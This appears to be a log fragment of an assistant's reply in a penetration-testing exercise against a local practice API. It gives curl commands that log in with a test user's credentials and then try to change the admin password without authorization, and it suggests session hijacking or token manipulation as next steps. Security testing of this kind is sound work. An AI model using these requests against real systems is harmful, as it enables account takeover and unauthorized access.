        "content": "To test for unauthorized password changes, you should first authenticate legitimately with the provided user account (John.Smith) to obtain any session tokens or cookies that are required for authenticated actions.\n\n1. Authenticate using John.Smith credentials to check for valid session establishment:\n\n```bash\ncurl -X POST 'http://localhost:5001/users/v1/login' \\\n-H 'Content-Type: application/json' \\\n-d '{\"username\":\"John.Smith\",\"password\":\"pass4\"}'\n```\n\nMake sure to capture the authentication token or cookie if any are returned in the response, as they may be needed for the next request.\n\n2. Test the password change API for the admin account without proper authorization. Attempt to change the password of the admin user by bypassing permission checks. If the system is vulnerable to horizontal privilege escalation, this may succeed:\n\n```bash\ncurl -X PUT 'http://localhost:5001/users/v1/admin%2Fpassword' \\\n-H 'Content-Type: application/json' \\\n-d '{\"password\":\"admin_password_changed\"}'\n```\n\nRemember, make sure to URL encode the username portion of the path as you are instructed.\n\nIf the application checks for the session but does not properly enforce access controls for the user whose password is being changed, this might work. If the request fails due to lack of permissions or authentication, you'll need to look into more sophisticated methods, like session hijacking, token manipulation, or exploiting logic flaws in the application."
